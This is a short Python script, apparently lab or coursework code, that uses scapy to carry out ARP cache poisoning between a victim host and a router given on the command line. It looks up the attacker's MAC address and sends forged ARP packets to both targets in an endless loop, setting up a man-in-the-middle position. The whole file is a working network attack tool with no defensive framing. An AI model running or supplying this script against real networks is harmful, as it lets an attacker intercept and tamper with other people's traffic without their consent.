from scapy.all import *
import sys
import time

def arp_cons(opcode, victim, spoof):
    # Get attacker's  mac address
    macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in macs:
        if mac != "00:00:00:00:00:00":
            spoof_mac = mac
    # Use ARP Request to obtain mac address
    victim_mac = sr1(ARP(op = 1, pdst = victim), verbose = 0)[0][ARP].hwsrc
    if spoof_mac is None or victim_mac is None:
        print "None mac Address!"
        sys.exit()
    # Construct ARP spoof packet to victime with attacker's mac address
    return ARP(op = opcode, psrc = spoof, hwsrc = spoof_mac, 
            pdst = victim, hwdst = victim_mac)


# MAIN program
if len(sys.argv) != 3:
    print "InCorrect Arguments!"
    sys.exit()

xp_ip = sys.argv[1]
rtr_ip = sys.argv[2]

# APR Poison
arp1 = arp_cons(1, xp_ip, rtr_ip)
arp2 = arp_cons(1, rtr_ip, xp_ip)

print arp1.show()
print arp2.show()

# Looping APR Request to keep spoofing
while(1):
    send(arp1, verbose = 0)
    send(arp2, verbose = 0)
    time.sleep(1)
